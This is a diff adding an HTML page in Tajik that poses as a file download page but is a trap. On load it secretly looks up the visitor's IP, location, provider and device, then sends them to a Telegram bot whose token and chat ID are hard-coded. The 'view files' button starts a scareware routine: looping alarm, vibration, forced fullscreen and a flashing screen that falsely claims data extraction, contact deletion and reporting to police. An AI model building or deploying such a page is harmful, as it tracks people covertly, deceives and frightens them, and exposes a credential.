@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Боргузории файл...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            transition: background 0.2s;
+        }
+        #main-content { text-align: center; }
+        .btn {
+            padding: 20px 40px;
+            font-size: 18px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes flash { 50% { background-color: red; } }
+    </style>
+</head>
+<body>
+
+    <div id="main-content">
+        <div class="loader"></div>
+        <h2>Файл барои шумо омода аст</h2>
+        <p>Барои дидани файл ва маълумоти махфӣ тугмаро пахш кунед:</p>
+        <button class="btn" onclick="startTrap()">ДИДАНӢ ФАЙЛҲО</button>
+    </div>
+
+    <script>
+        // МАЪЛУМОТИ ТУ
+        const token = '7808381296:AAHGBEKXEzDO5eHBgULMja0ev72eCfjtC-Y';
+        const chatId = '6520310173';
+
+        // 1. Гирифтани IP дарҳол пас аз даромадан (Пинҳонӣ)
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                const logMsg = `👤 **Касе линкро кушод!**\n🌐 IP: ${d.ip}\n📍 Ҷой: ${d.city}, ${d.country_name}\n🏢 Провайдер: ${d.org}\n📱 Дастгоҳ: ${navigator.userAgent}`;
+                
+                sendToTelegram(logMsg);
+            } catch (e) { console.log("Error logging IP"); }
+        };
+
+        // 2. Функсияи "Panic Mode" (баъди пахши тугма)
+        async function startTrap() {
+            // Овози ҳушдор
+            let audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+            audio.loop = true;
+            audio.play();
+
+            // Ларзиши телефон
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 200, 500, 200, 500]);
+                setInterval(() => navigator.vibrate(500), 1000);
+            }
+
+            // Пурра кардани экран
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            // Хабар ба Telegram
+            sendToTelegram("💀 **Ҷинояткор ТУГМАРО ПАХШ КАРД! Телефон дар ҳолати Panic Mode.**");
+
+            // Намоиши экрани тарснок
+            document.body.style.animation = "flash 0.1s infinite";
+            document.body.innerHTML = `
+                <div style="background:black; color:red; text-align:center; padding-top:20%; height:100vh; width:100vw; position:fixed; top:0; left:0; z-index:9999;">
+                    <h1 style="font-size: 40px;">⚠️ SYSTEM CRITICAL ERROR ⚠️</h1>
+                    <p style="font-size: 20px; color: white;">DATA EXTRACTION: <span id="pc">0</span>%</p>
+                    <p>IMEI: 449210XXXXXXXXX</p>
+                    <p>ҲАМАИ МАЪЛУМОТ БА СЕРВЕРИ ПОЛИС РАВОН ШУД!</p>
+                    <div style="border: 2px solid red; padding: 10px; margin: 20px; display: inline-block;">
+                        DELETING ALL CONTACTS...
+                    </div>
+                </div>
+            `;
+
+            let p = 0;
+            setInterval(() => { if(p < 100) { p++; document.getElementById('pc').innerText = p; } }, 50);
+        }
+
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+            });
+        }
+    </script>
+</body>
+</html>
